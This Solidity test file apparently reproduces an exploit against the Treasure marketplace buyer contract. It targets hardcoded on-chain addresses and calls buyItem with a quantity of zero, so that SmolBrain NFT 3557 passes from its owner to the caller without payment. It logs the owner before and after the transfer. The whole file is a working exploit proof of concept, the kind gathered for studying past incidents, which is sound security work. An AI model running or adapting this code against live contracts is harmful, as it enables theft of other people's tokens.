// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";


contract ContractTest is DSTest {
    ITreasureMarketplaceBuyer itreasure = ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
    IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
    uint  tokenId = 3557;
    address nftOwner;

    function testExploit() public {
       nftOwner = iSmolBrain.ownerOf(tokenId);
       emit log_named_address("Original NFT owner of SmolBrain:", nftOwner);
       itreasure.buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, nftOwner, 0, 6969000000000000000000);

      emit log_named_address("Exploit completed, NFT owner of SmolBrain:", iSmolBrain.ownerOf(tokenId));
}
  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual  returns (bytes4) {
  
    return this.onERC721Received.selector;
  }

}


